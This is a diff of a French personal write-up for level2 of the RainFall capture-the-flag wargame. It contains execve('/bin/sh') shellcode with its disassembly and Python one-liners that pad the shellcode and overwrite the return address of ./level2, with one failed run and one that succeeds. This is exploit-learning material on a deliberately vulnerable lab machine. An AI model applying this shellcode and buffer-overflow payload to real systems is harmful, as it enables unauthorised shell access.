@@ -123,19 +123,75 @@ je dois donc remonter de 80 bytes dans le buffer + la stack pour modifier la val
 
 
 
+On sait que l'on peut modifier l'adresse de retour mais pas comment executer du code qui nous permettra de recuper le flag.
+
+On a l'information que 
 
 
+//code asm
+
+nasm -f elf32 shell.asm -o shell.o
+ld -m elf_i386 shell.o -o shell
+
+objdump -D shell.o
 
 
-maintenant je si je fais :
+ /*
 
-python -c 'print "0"*80+"\x00\x00\x00\x00"' > /tmp/payload
+00000000 <_start>:
+   0:	31 c0                	xor    %eax,%eax
+   2:	50                   	push   %eax
+   3:	68 2f 2f 73 68       	push   $0x68732f2f
+   8:	68 2f 62 69 6e       	push   $0x6e69622f
+   d:	89 e3                	mov    %esp,%ebx
+   f:	50                   	push   %eax
+  10:	53                   	push   %ebx
+  11:	89 e1                	mov    %esp,%ecx
+  13:	b8 0b 00 00 00       	mov    $0xb,%eax
+  18:	cd 80                	int    $0x80
 
 
-level2@RainFall:~$ cat /tmp/payload - | ./level2
-0000000000000000000000000000000000000000000000000000000000000000
+*/
 
+
+ python2 -c 's="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb8\x0b\x00\x00\x00\xcd\x80"; print len(s)' -->26
+
+ python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb8\x0b\x00\x00\x00\xcd\x80" + "A" * 54 + "\x08\xa0\x04\x08"' > /tmp/shellcode
+
+ level2@RainFall:~$ cat /tmp/shellcode - | ./level2 
+1�Ph//shh/bin��PS��
+
+ls
 Segmentation fault (core dumped)
-level2@RainFall:~$ 
 
-il semblerait que je n'aie pas reussi a set ma valeur de retour a 0, ou alors il y a un autre probleme
+
+
+
+/*
+ * execve("/bin/sh", ["/bin/sh"], NULL)
+ *
+ * 804939f:       31 c0                   xor    %eax,%eax
+ * 80493a1:       50                      push   %eax
+ * 80493a2:       68 2f 2f 73 68          push   $0x68732f2f
+ * 80493a7:       68 2f 62 69 6e          push   $0x6e69622f
+ * 80493ac:       89 e3                   mov    %esp,%ebx
+ * 80493ae:       50                      push   %eax
+ * 80493af:       53                      push   %ebx
+ * 80493b0:       89 e1                   mov    %esp,%ecx
+ * 80493b2:       99                      cltd   
+ * 80493b3:       b0 0b                   mov    $0xb,%al
+ * 80493b5:       cd 80                   int    $0x80
+ */
+
+
+python2 -c 's="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"; print len(s)' --> 24
+
+python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "A" * 56 + "\x08\xa0\x04\x08"' > /tmp/shellcode
+
+
+level2@RainFall:~$ cat /tmp/shellcode - | ./level2 
+
+SUCCESS
+
+
+je comprends pas la ...
